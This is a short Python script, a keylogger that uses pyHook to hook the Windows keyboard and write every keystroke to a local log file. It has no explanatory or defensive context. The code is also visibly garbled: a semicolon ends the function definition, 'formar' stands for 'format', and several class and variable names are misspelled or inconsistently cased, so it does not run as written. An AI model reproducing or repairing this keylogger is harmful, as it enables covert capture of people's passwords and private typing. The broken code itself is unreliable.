import pyHook, pythoncom, sys, logging

file_log = 'C:\\pythonprograms\\log.txt'

def OnKeyboardEvent(event);
    logging.basicConfig(filename=file_log, level=logging.DEBUG, formar='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.Hookmanager()
hooks_maganer.Keydown = OnkeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
